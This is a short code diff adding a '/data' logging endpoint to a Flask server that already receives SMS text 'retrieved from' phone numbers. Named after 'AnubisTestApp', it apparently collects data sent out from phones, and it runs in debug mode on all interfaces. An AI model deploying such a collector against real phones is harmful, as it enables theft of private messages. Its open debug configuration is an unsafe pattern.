@@ -48,6 +48,14 @@ def sms():
     print("SMS Retrieved from Phone Number(" + address + ") : " + body)
     return "SMS Retrieved from Phone Number(" + address + ") : " + body , 200
 
+@app.route("/data" , methods =["GET","POST"])
+def logger():
+    data = request.data.decode();
+    print(data,end='\n')
+    with open(os.path.join('C:\\Users\\kian_\\Downloads\\Git\\AnubisTestApp_geo\\', "loggingdata.txt"),"a") as f:
+        f.write(data + "\n")
+    return "Data Received"
+
 if __name__ == "__main__":
     app.run('0.0.0.0', debug=True)
 
